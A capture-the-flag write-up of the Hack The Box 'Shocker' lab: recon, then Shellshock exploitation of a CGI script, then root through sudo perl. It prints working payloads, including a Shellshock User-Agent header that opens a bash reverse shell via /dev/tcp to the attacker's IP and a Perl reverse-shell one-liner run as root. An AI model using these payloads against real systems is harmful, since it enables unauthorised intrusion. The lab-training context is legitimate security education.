# Hackthebox Shocker


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Tue Oct  9 21:05:58 2018 as: nmap -v -sV -oA shocker_tcp 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Running a full scan did not show any additional open ports.

There are only two services to focus on. Let's start with the webserver.

### Content Discovery

I run Gobuster on the application as I browse it manually with a browser.

```
root@kali:~/hackthebox# gobuster -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/small.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.56/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/10/09 22:23:33 Starting gobuster
=====================================================
/cgi-bin/ (Status: 403)
=====================================================
2018/10/09 22:23:37 Finished
=====================================================
```

The Gobuster scan only reveal a directory called /cgi-bin/, but we are forbidden to access it.

If we visit the page we are presented with a picture and the text "Don't Bug Me!". The attacksurface seems extremly small. 

I download the picture to look for anything hidden (steganography), but no luck.

So, what next. The box is called "shocker", this could have something to do with shellshock. This is a vulnerability that could affect scripts in cgi-bin directories (among others).

Let's enumerate that folder some more. I specify that the scan should look for .sh-files using the -x flag on gobuster.

```
root@kali:~/hackthebox# gobuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.56/cgi-bin/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : sh
[+] Timeout      : 10s
=====================================================
2018/10/09 22:25:46 Starting gobuster
=====================================================
/user.sh (Status: 200)
=====================================================
2018/10/09 22:25:53 Finished
=====================================================
```

Bingo, we have found a script. There must be a shellshock issue here somewhere.


## Initial Compromise

There is a tool called Commix that can scan and exploit command injection issues such as shellshock.

```
root@kali:~/hackthebox/shocker# commix -u http://10.10.10.56/cgi-bin/user.sh --shellshock
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v2.6-stable
/\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ http://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2018 Anastasios Stasinopoulos (@ancst)
+--

[*] Checking connection to the target URL... [ SUCCEED ]
[*] Testing the shellshock injection technique... [ SUCCEED ][*] Identified the following injection point with a total of 2 HTTP(S) requests.                                                               

[+] The (User-Agent) 'http://10.10.10.56/cgi-bin/user.sh' seems vulnerable via shellshock injection technique.                                                                                              
    [~] Payload: "() { :; }; echo CVE-2014-6271:Done;"

[?] Do you want a Pseudo-Terminal shell? [Y/n] >

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > 
```
However I found the shell somewhat buggy. So let's do it manually. We know that the User-Agent header is vulnerable.

The following GET request will list the contents of the webroot folder:

```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; echo; /bin/ls
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Reverse shell:

```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.17/1234 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
Catch the shell:

```
root@kali:~/htb/shocker# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.56] 58426
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

We can also use the Metasploit module for shellshock to get a meterpreter shell:

```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (861480 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.56:47002) at 2018-11-12 21:45:06 +0100

meterpreter > getuid 
Server username: uid=1000, gid=1000, euid=1000, egid=1000
meterpreter > sysinfo
Computer     : 10.10.10.56
OS           : Ubuntu 16.04 (Linux 4.4.0-96-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```
## Privilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

Using our shell I check what we can do with sudo:

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can run perl as root without having to supply a password with sudo. So if we simply run a perl reverse shell to our attacking machine, with sudo, we should have root.

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'use Socket;$i="10.10.14.17";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

We catch the incoming shell:

```
root@kali:~/htb# nc -lvp 443
listening on [any] 443 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.56] 36864
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
